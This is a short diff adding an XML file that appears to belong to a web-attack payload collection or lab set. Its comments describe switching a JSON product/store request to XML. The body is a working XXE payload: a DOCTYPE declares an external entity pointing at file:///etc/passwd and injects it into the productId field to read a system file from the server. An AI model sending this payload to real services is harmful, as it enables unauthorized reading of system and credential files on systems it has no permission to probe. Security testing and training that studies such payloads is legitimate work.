@@ -1,0 +1,11 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<!-- Content-Type Switch - JSON endpoint to XML -->
+<!-- Use: Change Content-Type from application/json to application/xml -->
+<!-- Original JSON: {"productId": 1, "storeId": 1} -->
+<!DOCTYPE foo [
+  <!ENTITY xxe SYSTEM "file:///etc/passwd">
+]>
+<root>
+  <productId>&xxe;</productId>
+  <storeId>1</storeId>
+</root>
